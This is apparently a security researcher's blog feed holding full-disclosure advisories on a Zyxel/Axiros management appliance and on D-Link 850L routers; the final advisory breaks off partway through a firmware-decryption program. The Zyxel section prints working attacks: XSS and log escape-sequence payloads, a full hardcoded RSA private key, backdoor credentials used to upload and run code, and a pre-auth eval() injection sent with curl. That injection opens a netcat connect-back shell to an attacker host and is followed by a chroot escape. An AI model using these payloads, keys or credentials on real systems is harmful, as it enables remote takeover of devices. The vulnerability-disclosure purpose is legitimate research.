<p>The <code>jwt_secret</code> and <code>jwt_secret_id</code> are generated as unique key for each appliance.</p>
<p>But an attacker can extract them using backdoors APIs (please read the sub-section <a href="#backdoor-apis">Backdoor APIs</a>)
or by using the anonymous access to the ZODB interface and decrypting the secret <code>account_id</code> value.</p>
<p>Also, the connection to the cloud in myzyxel.pyc is done over HTTPS.
The Python script is using the requests module,
with the HTTPS_VERIFY variable set to <code>false</code> from <code>/opt/axess/etc/default/axess</code>:</p>
<pre><code>root@chopin:~# cat /opt/axess/etc/default/axess
[...]
# true or false is allowed
HTTPS_VERIFY=false
[...]
</code></pre>
<p>When reading <code>myzyxel.pyc</code>, the value of <code>HTTPS_VERIFY</code> is always <code>false</code>.
So the verification of certificate is never done from the appliance,
allowing an attacker to MITM the HTTPS requests:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">19</span> HTTPS_VERIFY <span style="color: #666666">=</span> get_cfg_val(<span style="color: #BA2121">&#39;HTTPS_VERIFY&#39;</span>) <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;true&#39;</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">114</span>         r <span style="color: #666666">=</span> requests<span style="color: #666666">.</span>get(SECU_API_URL, verify<span style="color: #666666">=</span>HTTPS_VERIFY, data<span style="color: #666666">=</span>post_data)
[<span style="color: #666666">...</span>]
<span style="color: #666666">146</span>         r <span style="color: #666666">=</span> requests<span style="color: #666666">.</span>patch(url, verify<span style="color: #666666">=</span>HTTPS_VERIFY, data<span style="color: #666666">=</span>post_data)
[<span style="color: #666666">...</span>]
<span style="color: #666666">180</span>         r <span style="color: #666666">=</span> requests<span style="color: #666666">.</span>patch(url, verify<span style="color: #666666">=</span>HTTPS_VERIFY, data<span style="color: #666666">=</span>post_data)
[<span style="color: #666666">...</span>]
<span style="color: #666666">229</span>     r <span style="color: #666666">=</span> requests<span style="color: #666666">.</span>post(url, verify<span style="color: #666666">=</span>HTTPS_VERIFY, data<span style="color: #666666">=</span>post_data)
[<span style="color: #666666">...</span>]
<span style="color: #666666">253</span>     r <span style="color: #666666">=</span> requests<span style="color: #666666">.</span>get(url, verify<span style="color: #666666">=</span>HTTPS_VERIFY, data<span style="color: #666666">=</span>post_data)
[<span style="color: #666666">...</span>]
<span style="color: #666666">279</span>     r <span style="color: #666666">=</span> requests<span style="color: #666666">.</span>patch(url, verify<span style="color: #666666">=</span>HTTPS_VERIFY, data<span style="color: #666666">=</span>post_data)
</pre></div>

<p>The non-verification of SSL seems to be a standard practice in the code. e.g.:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>ret <span style="color: #666666">=</span> requests<span style="color: #666666">.</span>get(<span style="color: #BA2121">&#39;https://service-dispatcher.cloud.zyxel.com/s/geoip/v1/geoInfo?ipAddress=&#39;</span> <span style="color: #666666">+</span> cpeIp, verify<span style="color: #666666">=</span><span style="color: #008000">False</span>, timeout<span style="color: #666666">=2</span>)
</pre></div>

<p>It is recommended to avoid using the cloud functionality (api.myzyxel.com - 54.174.11.58 AWS, 18.234.22.109 AWS and 54.84.22.89 AWS).</p>
<p><a id="xmpp-escape-seq-injection"></a></p>
<h2>Details - xmppCnrSender.py log escape sequence injection</h2>
<p>The Python script <code>xmppCnrSender.py</code> is running as root and provides
an open HTTP/1.1-to-XMPP gateway on port 8083/tcp on the WAN interface for CPEs management.</p>
<p>The logs written in <code>/var/log/axxmpp.log</code> are not sanitized and
an attacker can send escape sequence injections.</p>
<pre><code>echo -en "GET /\x1b]2;owned?\x07\x0a\x0d\x0a\x0d" &gt; payload
nc -v [ip] 8083 &lt; payload
</code></pre>
<p>(code from from <a href="http://www.ush.it/team/ush/hack_httpd_escape/adv.txt">http://www.ush.it/team/ush/hack_httpd_escape/adv.txt</a>)</p>
<p>This is likely to change the admin's terminal title to <code>owned?</code> when
he runs <code>cat /var/log/axxmpp.log</code> or <code>tail -f /var/log/axxmpp.log</code>.</p>
<p>Also, this will add some fun to this long journey.</p>
<p><a id="xmpp-no-auth-cleartext"></a></p>
<h2>Details - xmppCnrSender.py no authentication and clear-text communication</h2>
<p>The Python script  <code>xmppCnrSender.py</code> is running as root and provides
a open HTTP/1.1-to-XMPP gateway on port 8083/tcp on the WAN interface for CPEs management.</p>
<p>2 Apis are provided:</p>
<ul>
<li>/registerCpe/?JID=%(username)s&amp;PWD=%(password)s</li>
<li>/cnr/?JID=%(jabberid)s&amp;CRUs=%(username)s&amp;CRP=%(password)s</li>
</ul>
<p>By default the traffic is not encrypted.</p>
<p>Furthermore, the registration is open and anyone can create accounts.</p>
<p><a id="zope-out-of-range"></a></p>
<h2>Details - Incorrect HTTP requests cause out of range access in Zope</h2>
<p>By default, Apache2 is running on ports 9673/tcp and 80/tcp on the WAN interface. It provides an interface to a Zope WSGI.</p>
<p>By sending invalid HTTP requests, it is possible to cause exceptions in Zope because of the lack of the '/' in the HTTP version:</p>
<pre><code>vm# telnet 192.168.1.1 9673
GET / yolo &lt;---- yolo is used instead of 'PROTOCOL/VERSION'


HTTP/1.1 500 Internal Server Error
[...]

An error occurred.  See the error logs for more information.
&lt;type 'exceptions.IndexError'&gt; - list index out of range
</code></pre>
<p>The problem appears to come from the Zope library: 
<a href="https://github.com/zopefoundation/Zope/blob/master/src/ZPublisher/WSGIPublisher.py#L347">https://github.com/zopefoundation/Zope/blob/master/src/ZPublisher/WSGIPublisher.py#L347</a>:</p>
<pre><code>343        new_response = (
344            _response
[...]
347        new_response._http_version = environ['SERVER_PROTOCOL'].split('/')[1]
</code></pre>
<p><a id="xss"></a></p>
<h2>Details - XSS on the web interface</h2>
<p>The webinterface on ports 80/tcp and 9673/tcp is prone to a lot of XSS:</p>
<pre><code>vm# curl -v 'http://192.168.1.1:9673/live/CPEManager/AXCampaignManager/handle_campaign_script_link?JSON=1&amp;script_name=&lt;XSS&gt;'
&lt;XSS&gt;

vm# curl -v 'http://192.168.1.1:9673/live/CPEManager/AXCampaignManager/handle_campaign_script_link?script_name=&lt;ddaaaaa&gt;'
&lt;a title="&lt;ddaaaaa&gt;" href="/&lt;ddaaaaa&gt;/manage" target="_blank"&gt;&lt;ddaaaaa&gt;&lt;/a&gt;#

vm# curl -v 'http://192.168.1.1:9673/live/CPEManager/AXCampaignManager/generate_sp_link?cid2=&lt;xss&gt;'
&lt;xss&gt;
</code></pre>
<p>Finding others XSS is left as an exercise for the reader.</p>
<p><a id="private-ssh-key"></a></p>
<h2>Details - Private SSH key</h2>
<p>The system contains an hardcoded SSH Key in the TR69 configuration:</p>
<pre><code>root@chopin:/opt/axess/opt/axess/AXAssets# cat /opt/axess/opt/axess/AXAssets/default_axess/axess/TR69/Handlers/turbolink/sshkeys/id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQDC4GnOyypL29jIK3cye/MDRXobza+4gdCF9hUKxKdA/HRpeOB1
vPZ5FuQRFR6tSHACOd5xAMILnWMhu/c4F9o/gDF1ZrfsyUJ39seTVBKQFBesgZlF
Xjmf/zBatrpc0DwvpxY1ql0CHGt8G3OO2f3rbRJBkFTMXfF9xUmEudH4nQIBIwKB
gCFoTKcbg5f5zWQktVkckA8we1U5NBEAT6Hvq9X104d7vC9WjOD70nsoft5bZFg4
Tbc9HtGLGfNczypavKqHvwNFgwryFO2pzlv6NsqvqPXi56rO5GNb5yGrve6k+4aH
X3BDfxd1SbRIYZuYAgAmLXe8yDcDRixBKbrVQUtJXhULAkEA8T6HyD0Lp2wKfwgo
nMJ7Qz5F3h/2cSCyYyLHj91i56m9KcLJBiJ2AeVYO4hcV3InlOpQ7osU5cdhJK0S
QRnAkQJBAM7L2G+rdsNNVO7VIbahJSU8rOyaYKpUqTI5ow8hvn2QY55DY81h8HRM
wuk03E6CiWBCr7lbCqa2sBn05fdovU0CQQC6Gkt9NmgTcJph/vrCEl8WncDeja97
12UKpc0l1qtiQRzls4Uh/VO4UdZZz5exLC0pvBKMIiYQV/p7YPDTIn6bAkEAn4dP
MZLmlqlext7uHyva05U08Qlgg2Xhm8YQEvzGJllxa3XQpcCU7ACznfWUAgztogeO
33IeKNYS0jHzOzOKtwJBAKnIlBv1GAW8vEcmTC2NRPCPm9Ta//04rk6DTsl1SaU4
8Zav73P9sJWbnOCzBRI7qaHjK6Zx9L9h04bdk5uvdeE=
-----END RSA PRIVATE KEY-----
root@chopin:/opt/axess/opt/axess/AXAssets#
</code></pre>
<p><a id="backdoor-apis"></a></p>
<h2>Details - Backdoor APIs</h2>
<p>Some APIs are reachable without authentication and don't have any documentation.
The codes exist as object inside the ZDOB:</p>
<ul>
<li>http://[ip]:9673/update_all_realm_license?cnmid=%s</li>
<li>http://[ip]:9673/zy_install_user</li>
<li>http://[ip]:9673/zy_install_user_key</li>
<li>http://[ip]:9673/zy_get_user_id_and_key?cnmid=%s' % cnmid &lt;- allows to dump the 'access_key_id' and the 'secret_access_key'</li>
<li>http://[ip]:9673/zy_get_instances_for_update</li>
<li>
<p>http://[ip]:9673/live/GLOBALS?key=CLOUDCNM</p>
</li>
<li>
<p>http://[ip]/update_all_realm_license?cnmid=%s</p>
</li>
<li>http://[ip]/zy_install_user</li>
<li>http://[ip]/zy_install_user_key</li>
<li>http://[ip]/zy_get_user_id_and_key?cnmid=%s' % cnmid &lt;- allows to dump the 'access_key_id' and the 'secret_access_key'</li>
<li>http://[ip]/zy_get_instances_for_update</li>
<li>http://[ip]/live/GLOBALS?key=CLOUDCNM</li>
</ul>
<p><code>/zy_get_user_id_and_key</code> seems to allow an attacker to dump the <code>access_key_id</code> and
the <code>secret_access_key</code> used for the 'Cloud' configuration, without authentication.</p>
<p><a id="backdoor-management-rce"></a></p>
<h2>Details - Backdoor management access and RCE</h2>
<p>The web interface on ports 80/tcp and 9673/tcp has a backdoor management access allowing to download and upload python code, templates, webpages and ZEXPs.</p>
<p>The credentials are: <code>axiros</code> / <code>q6xV4aW8bQ4cfD-b</code></p>
<p>We are using the available <code>zcp.py</code> tool in <code>/opt/axess/opt/axess/zyxel</code>.
This pre-written tool allows to upload some files remotely and update the ZODB objects.</p>
<p>We download the files:</p>
<pre><code>vm# ./zcp.py -v -r -f -u axiros -p q6xV4aW8bQ4cfD-b http://192.168.1.1:9673/live/CPEManager/AXCampaignManager dir
axess root@chopin:/opt/axess/zyxel/tmp# ./zcp.py -v -r -f -u axiros -p q6xV4aW8bQ4cfD-b http://192.168.1.1:9673/live/CPEManager/AXCampaignManager dir
DEBUG:root:Download mode engaged
INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): 192.168.1.1
DEBUG:requests.packages.urllib3.connectionpool:"GET /live/manage_main?__ac_name=axiros&amp;__ac_password=q6xV4aW8bQ4cfD-b HTTP/1.1" 200 4335
DEBUG:requests.packages.urllib3.connectionpool:"GET /live/CPEManager/AXCampaignManager/manage_main HTTP/1.1" 200 3680
DEBUG:requests.packages.urllib3.connectionpool:"GET /live/CPEManager/AXCampaignManager/charts/manage_main HTTP/1.1" 200 3374
DEBUG:root:Downloading .py at charts campaign_line_chart_html
[...]
DEBUG:requests.packages.urllib3.connectionpool:"GET /live/CPEManager/AXCampaignManager/campaign_log_actions/document_src HTTP/1.1" 200 347
Download complete at 11:11:14, took     0.2794 Seconds
</code></pre>
<p>We add the python code inside <code>dir/handle_campaign_script_link.py</code>:</p>
<pre><code>vm# echo 'return 1 + 1' &gt; dir/handle_campaign_script_link.py
</code></pre>
<p>We then upload the updated python file using the provided zcp.py tool:</p>
<pre><code>vm# ./zcp.py -v -r -f -u axiros -p q6xV4aW8bQ4cfD-b dir http://192.168.1.1:9673/live/CPEManager/AXCampaignManager
DEBUG:root:Upload mode engaged
INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): 192.168.1.1
DEBUG:requests.packages.urllib3.connectionpool:"GET /live/manage_main?__ac_name=axiros&amp;__ac_password=q6xV4aW8bQ4cfD-b HTTP/1.1" 200 4335
DEBUG:requests.packages.urllib3.connectionpool:"GET /live/CPEManager/AXCampaignManager/manage_main HTTP/1.1" 200 3680
[...]
</code></pre>
<p>Testing the execution of Python:</p>
<pre><code>vm# curl 'http://192.168.1.1:9673/live/CPEManager/AXCampaignManager/handle_campaign_script_link'
2
</code></pre>
<p>Python code is sucessfully executed on the appliance as <code>axess</code>.</p>
<p><a id="pre-auth-rce"></a></p>
<h2>Details - Pre-auth RCE with chrooted access</h2>
<p>It is possible to achieve RCE by abusing an insecure API due to unsafe calls to eval():</p>
<pre><code>vm# curl "http://192.168.1.1:9673/live/CPEManager/AXCampaignManager/delete_cpes_by_ids?cpe_ids=__import__('os').system('id&gt;/tmp/a')"
</code></pre>
<p>Output is stored in the "Axess" chroot:</p>
<pre><code>root@chopin:/opt/axess/tmp# cat /opt/axess/tmp/a
uid=210(axess) gid=210(axess) groups=210(axess)
</code></pre>
<p>It is also possible to get a connect-back shell:</p>
<pre><code>vm# curl "http://192.168.1.1:9673/live/CPEManager/AXCampaignManager/delete_cpes_by_ids?cpe_ids=__import__('os').system('nc+-e+/bin/sh+192.168.1.2+1337')"
</code></pre>
<p>On 192.168.1.2, the attacker receives the shell:</p>
<pre><code>vm# nc -l -v -p 1337
listening on [any] 1337 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.1] 39910
id
uid=210(axess) gid=210(axess) groups=210(axess)
uname -ap
Linux chopin 3.2.0-5-amd64 #1 SMP Debian 3.2.96-3 x86_64 GNU/Linux
</code></pre>
<p>Also, even if the shell is within a chrooted environment, it is possible to break the chroot using a LPE and
the fact that /proc is mounted inside the chroot:</p>
<pre><code>vm# nc -l -v -p 1337
listening on [any] 1337 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.1] 39910
id
uid=0(root) gid=0(root) groups=0(root)
ls / | head
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
chroot /proc/1/root     # PRISON BREAK!
ls / | head
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
</code></pre>
<h2>Vendor Response</h2>
<p>Full-disclosure is applied as we believe some backdoors are intentionally placed by the vendor. </p>
<p>Also, there are likely to be way more 0day vulnerabilities in the appliance, but we decided not to dig more due to time constraints.</p>
<p>On a side note, the solution also contains some SQLi, some references to ISPs in Greece(?!?) and Germany.</p>
<h2>Report Timeline</h2>
<ul>
<li>Dec 20, 2019: Vulnerabilities found and this advisory was written.</li>
<li>Mar 09, 2020: A public advisory is sent to security mailing lists.</li>
<li>Jun 26, 2020: MITRE providesli>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>) and Alexandre Torres.</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/advisories/2020-zyxel-0x00-secumanager.txt">https://pierrekim.github.io/advisories/2020-zyxel-0x00-secumanager.txt</a></p>
<p><a href="https://pierrekim.github.io/blog/2020-03-09-zyxel-secumanager-0day-vulnerabilities.html">https://pierrekim.github.io/blog/2020-03-09-zyxel-secumanager-0day-vulnerabilities.html</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>Update - Pwning the Dlink 850L routers and abusing the MyDlink Cloud protocol</title>
        <link href="2017-09-21-update-dlink-850l-mydlink-cloud-0days-vulnerabilities.html"/>
        <content type="html"><p>An update on the post "<a href="https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html">Pwning the Dlink 850L routers and abusing the MyDlink Cloud protocol</a>":</p>
<p>MITRE was very effective and provided several CVEs for these vulnerabilities:</p>
<p>CVE-2017-14413, CVE-2017-14414, CVE-2017-14415, CVE-2017-14416, CVE-2017-14417, CVE-2017-14418,
CVE-2017-14419, CVE-2017-14420, CVE-2017-14421, CVE-2017-14422, CVE-2017-14423, CVE-2017-14424,
CVE-2017-14425, CVE-2017-14426, CVE-2017-14427, CVE-2017-14428, CVE-2017-14429, CVE-2017-14430.</p>
<p>D-Link provided firmware updates at: <a href="http://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10074">http://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10074</a>.</p>
<p><strong>Full-Disclosure seems to work! It forced D-Link to provide working security patches to the public in a timely manner.</strong></p>
<p>Only 14 CVEs (of 18 CVEs) are recognized in the list from the Security Announcement from D-Link. I verified myself that the vulnerabilities have been indeed patched or not - for all 18 CVEs - as shown below on a <strong>real router with the latest firmware</strong>.</p>
<p><strong>This work was possible thanks to another pre-auth 0day exploit that I have not yet released and which still works against the latest revB firmware (<code>DIR850LB1_FW220WWb03.bin</code>).</strong></p>
<pre><code>user@kali:~/petage-dlink$ ./pwn-dlink-850-003 192.168.0.1
[...]
# uname -ap
Linux dlinkrouter 2.6.30.9 #1 Mon Sep 18 10:27:42 CST 2017 rlx GNU/Linux
# busybox 
BusyBox v1.14.1 (2017-09-18 20:18:33 CST) multi-call binary
Copyright (C) 1998-2008 Erik Andersen, Rob Landley, Denys Vlasenko
and others. Licensed under GPLv2.
[...]
#
</code></pre>
<h2>Firmware "protection"</h2>
<p>The algorithm seems to have been updated. <a href="https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html#firmware-protection">The previous program</a> doesn't work anymore. <strong>Luckily, having a root shell on the device gives me some hints about how to decipher firmware images.</strong></p>
<h2>WAN &amp;&amp; LAN - revA - XSS - CVE-2017-14413, CVE-2017-14414, CVE-2017-14415, CVE-2017-14416</h2>
<p>Corrected - the vulnerable files have been removed, as shown below:</p>
<pre><code># cd /htdocs/web
# ls -la *php
-rw-r--r--    1 root     root          143 Sep 18  2017 wiz_mydlink.php
-rw-r--r--    1 root     root         3768 Sep 18  2017 vpnconfig.php
-rw-r--r--    1 root     root          204 Sep 18  2017 version.php
-rw-r--r--    1 root     root         1074 Sep 18  2017 getcfg.php
-rw-r--r--    1 root     root         2661 Sep 18  2017 dnslog.php
-rw-r--r--    1 root     root          149 Sep 18  2017 bsc_mydlink.php
#
</code></pre>
<h2>WAN &amp;&amp; LAN - revB - Retrieving admin password, gaining full access using the custom mydlink Cloud protocol - CVE-2017-14417, CVE-2017-14418</h2>
<p>Corrected - the vulnerable file has been removed.</p>
<pre><code># ls /htdocs/web/register_send.php
ls: /htdocs/web/register_send.php: No such file or directory
#
</code></pre>
<p>Note that the device still sends clear-text passwords to the Cloud protocol (www.mydlink.com).</p>
<h2>WAN - revA and revB - Weak Cloud protocol - CVE-2017-14419, CVE-2017-14420</h2>
<p>Not checked as this is going to be taking to much time.</p>
<h2>LAN - revB - Backdoor access - CVE-2017-14421</h2>
<p>Corrected.</p>
<h2>WAN &amp;&amp; LAN - revA and revB - Stunnel private keys - CVE-2017-14422</h2>
<p>Corrected - as shown below:</p>
<pre><code># ls -la /etc/stunnel.key
ls: /etc/stunnel.key: No such file or directory
#
</code></pre>
<p>The new certificate (<code>/tmp/server.key</code> and <code>/tmp/server.crt</code>) is generated on-the-fly during the boot process by the <code>scripts/updatessl.sh</code> script. It's a self-signed certificate:</p>
<pre><code># cat scripts/updatessl.sh
[...]
openssl req -new -newkey rsa:2048 -days $SSLDAYS -sha256 -nodes -x509 -subj "/C=TW/ST=Taiwan/L=Taipei/O=D-Link Corporation/OU=D-Link WRPD/CN=General Root CA/emailAddress=webmaster@localhost" -extensions usr_cert -keyout $TMPKEY -out $TMPPEM -config /etc/openssl.cnf -rand $TMPRAND
[...]
</code></pre>
<p>This opens question about the security of the Cloud protocol.</p>
<h2>WAN &amp;&amp; LAN - revA - Nonce bruteforcing for DNS configuration - CVE-2017-14423</h2>
<p>Corrected - this file has been removed from the firmware image.</p>
<h1>Local - revA and revB - Weak files permission and credentials stored in cleartext - CVE-2017-14424, CVE-2017-14425, CVE-2017-14426, CVE-2017-14427, CVE-2017-14428</h1>
<p>Corrected - the passwords are replaced by 'x' everywhere:</p>
<pre><code># cat /var/passwd
"Admin" "x" "0"
# cat /var/etc/hnapasswd
Admin:x
# ls -la /var/passwd
-rw-rw-rw-    1 root     root           16 Jan  1 00:00 /var/passwd
# cat /var/passwd
"Admin" "x" "0"
# ls -la /var/etc/hnapasswd
-rw-rw-rw-    1 root     root            8 Jan  1 00:00 /var/etc/hnapasswd
# cat /var/etc/hnapasswd
Admin:x
# cat /var/etc/hnapasswd
Admin:x
# ls -la /var/etc/hnapasswd
-rw-rw-rw-    1 root     root            8 Jan  1 00:00 /var/etc/hnapasswd
# ls -la /var/etc/passwd
-rw-r--r--    1 root     root          146 Jan  1 00:00 /var/etc/passwd
# cat /var/etc/passwd
root:x:0:0:Linux User,,,:/home/root:/bin/sh
nobody:x:1000:500:Linux User,,,:/home/nobody:/bin/sh
Admin:x:1001:0:Linux User,,,:/home/Admin:/bin/sh
# cat /var/etc/shadow
root:!:10956:0:99999:7:::
nobody:!:10956:0:99999:7:::
Admin:!:10956:0:99999:7:::
# ls -la /var/run/storage_account_root
-rw-rw-rw-    1 root     root           12 Jan  1 00:00 /var/run/storage_account_root
# cat /var/run/storage_account_root
admin:x,:::
# ls -la /var/run/hostapd*conf
-rw-rw-rw-    1 root     root         1160 Jan  1 00:00 /var/run/hostapd-wlan1.conf
-rw-rw-rw-    1 root     root         1170 Jan  1 00:00 /var/run/hostapd-wlan0.conf
</code></pre>
<h2>WAN - revB - Pre-Auth RCEs as root (L2) - CVE-2017-14429</h2>
<p>Corrected - the variables are sanitized.</p>
<h2>LAN - revA and revB - DoS against some daemons - CVE-2017-14430</h2>
<p>Corrected? I don't think so.</p>
<h2>Conclusion</h2>
<p>I'm happily surprised by the results of dropping 0days without coordinated disclosure when it is about D-Link products. Should this be the only method with D-Link to get working security patches in a timely manner?</p>
<p>Hopefully one day a coordinated disclosure could work in the same way.</p>
<h2>Disclaimer</h2>
<p>This research is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>Pwning the Dlink 850L routers and abusing the MyDlink Cloud protocol</title>
        <link href="2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html"/>
        <content type="html"><h2>Product Description</h2>
<p>Dlink is a multinational networking equipment manufacturing corporation.</p>
<p>The Dlink 850L is a Wireless AC1200 Dual Band Gigabit "Cloud" Router.</p>
<p>Mydlink Cloud Services allow you to access, view and control the devices on your home network from anywhere.</p>
<h2>Vulnerabilities Summary</h2>
<p>The Dlink 850L is a router overall badly designed with a lot of vulnerabilities.</p>
<p>Basically, everything was pwned, from the LAN to the WAN. Even the custom MyDlink cloud protocol was abused.</p>
<p>My research in analyzing the security of Dlink 850L routers starts from a recent security contest organized by a security company. The Dlink 850L has 2 versions of these routers with very slight hardware modifications.</p>
<p>The contest targeted the first version (revisionA) but I (unfortunately) received the wrong version, revisionB (thank you Amazon!), which was not eligible for the contest.  </p>
<p>In this advisory, I would like to introduce the 0day vulnerabilities from both versions of Dlink 850L that were not submitted to the contest.
Note that <a href="https://blogs.securiteam.com/index.php/archives/3364">I submitted a valid vulnerability to SSD which was patched</a>.</p>
<p><strong>Following a very badly coordinated previous disclosure with Dlink last February
(see <a href="https://pierrekim.github.io/blog/2017-02-02-update-dlink-dwr-932b-lte-routers-vulnerabilities.html">https://pierrekim.github.io/blog/2017-02-02-update-dlink-dwr-932b-lte-routers-vulnerabilities.html</a>),
Full-disclosure is applied this time</strong>.</p>
<p>The summary of the vulnerabilities is: </p>
<ol>
<li><a href="#firmware-protection">Firmware "protection"</a></li>
<li><a href="#xss">WAN &amp;&amp; LAN - revA - XSS - CVE-2017-14413, CVE-2017-14414, CVE-2017-14415, CVE-2017-14416</a></li>
<li><a href="#rce-mydlink">WAN &amp;&amp; LAN - revB - Retrieving admin password, gaining full access using the custom mydlink Cloud protocol - CVE-2017-14417, CVE-2017-14418</a></li>
<li><a href="#mydlink-cloud-protocol">WAN        - revA and revB - Weak Cloud protocol - CVE-2017-14419, CVE-2017-14420</a></li>
<li><a href="#backdoor">LAN        - revB - Backdoor access - CVE-2017-14421</a></li>
<li><a href="#keys">WAN &amp;&amp; LAN - revA and revB - Stunnel private keys - CVE-2017-14422</a></li>
<li><a href="#dns">WAN &amp;&amp; LAN - revA - Nonce bruteforcing for DNS configuration - CVE-2017-14423</a></li>
<li><a href="#cleartext-passwords">Local      - revA and revB - Weak files permission and credentials stored in cleartext - CVE-2017-14424, CVE-2017-14425, CVE-2017-14426, CVE-2017-14427, CVE-2017-14428</a></li>
<li><a href="#pre-auth-root-rces">WAN        - revB - Pre-Auth RCEs as root (L2) - CVE-2017-14429</a></li>
<li><a href="#dos">LAN       - revA and revB - DoS against some daemons - CVE-2017-14430</a></li>
</ol>
<p>revA targets the revision A of the router with the latest firmware available (<code>DIR850L_REVA_FW114WWb07_h2ab_beta1.bin</code>).</p>
<p>revB targets the revision B of the router with the latest firmware images available (<code>DIR850LB1_FW207WWb05.bin</code> and <code>DIR850L_REVB_FW207WWb05_h1ke_beta1.bin</code> from <a href="http://support.dlink.com/ProductInfo.aspx?m=DIR-850L">http://support.dlink.com/ProductInfo.aspx?m=DIR-850L</a>, <code>DIR850LB1 FW208WWb02.bin</code> from <a href="http://support.dlink.com.au/Download/download.aspx?product=DIR-850L">http://support.dlink.com.au/Download/download.aspx?product=DIR-850L</a>).</p>
<p><a id="firmware-protection"></a></p>
<h2>Details - Firmware "protection"</h2>
<p>The latest firmware for Dlink 850L revA (<code>DIR850L_REVA_FW114WWb07_h2ab_beta1.bin</code>) is not protected and a new firmware image can be trivially forged by an attacker.</p>
<p>The latest firmware images for Dlink 850L revB (<code>DIR850LB1_FW207WWb05.bin</code>, <code>DIR850L_REVB_FW207WWb05_h1ke_beta1.bin</code> and <code>DIR850LB1 FW208WWb02.bin</code>) are password-protected with a hardcoded password.</p>
<p>Here is a program to decrypt the firmware image:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #408080; font-style: italic">/* </span>
<span style="color: #408080; font-style: italic"> * Simple tool to decrypt D-LINK DIR-850L REVB firmwares </span>
<span style="color: #408080; font-style: italic"> *</span>
<span style="color: #408080; font-style: italic"> * $ gcc -o revbdec revbdec.c</span>
<span style="color: #408080; font-style: italic"> * $ ./revbdec DIR850L_REVB_FW207WWb05_h1ke_beta1.bin wrgac25_dlink.2013gui_dir850l &gt; DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted</span>
<span style="color: #408080; font-style: italic"> */</span>

<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;sys/types.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;sys/stat.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;fcntl.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;unistd.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdio.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;string.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdlib.h&gt;</span><span style="color: #BC7A00"></span>

<span style="color: #BC7A00">#define USAGE &quot;Usage: decimg &lt;filename&gt; &lt;key&gt;\n&quot;</span>

<span style="color: #B00040">int</span> <span style="color: #0000FF">main</span>(<span style="color: #B00040">int</span>    argc,
         <span style="color: #B00040">char</span>   <span style="color: #666666">**</span>argv)
{
        <span style="color: #B00040">int</span>     i, fi;
        <span style="color: #B00040">int</span>     fo <span style="color: #666666">=</span> STDOUT_FILENO, fe <span style="color: #666666">=</span> STDERR_FILENO;

        <span style="color: #008000; font-weight: bold">if</span> (argc <span style="color: #666666">!=</span> <span style="color: #666666">3</span>)
        {
                write(fe, USAGE, strlen(USAGE));
                <span style="color: #008000; font-weight: bold">return</span> (EXIT_FAILURE);
        }

        <span style="color: #008000; font-weight: bold">if</span> ((fi <span style="color: #666666">=</span> open(argv[<span style="color: #666666">1</span>], O_RDONLY)) <span style="color: #666666">==</span> <span style="color: #666666">-1</span>)
        {
                perror(<span style="color: #BA2121">&quot;open&quot;</span>);
                write(fe, USAGE, strlen(USAGE));
                <span style="color: #008000; font-weight: bold">return</span> (EXIT_FAILURE);
        }

        <span style="color: #008000; font-weight: bold">const</span> <span style="color: #B00040">char</span> <span style="color: #666666">*</span>key <span style="color: #666666">=</span> argv[<span style="color: #666666">2</span>];
        <span style="color: #B00040">int</span> kl <span style="color: #666666">=</span> strlen(key);

        i <span style="color: #666666">=</span> <span style="color: #666666">0</span>;
        <span style="color: #008000; font-weight: bold">while</span> (<span style="color: #666666">1</span>)
        {
                <span style="color: #B00040">char</span> buffer[<span style="color: #666666">4096</span>];
                <span style="color: #B00040">int</span> j, len;
                len <span style="color: #666666">=</span> read(fi, buffer, <span style="color: #666666">4096</span>);
                <span style="color: #008000; font-weight: bold">if</span> (len <span style="color: #666666">&lt;=</span> <span style="color: #666666">0</span>)
                        <span style="color: #008000; font-weight: bold">break</span>;
                <span style="color: #008000; font-weight: bold">for</span> (j <span style="color: #666666">=</span> <span style="color: #666666">0</span>; j <span style="color: #666666">&lt;</span> len; j<span style="color: #666666">++</span>) {
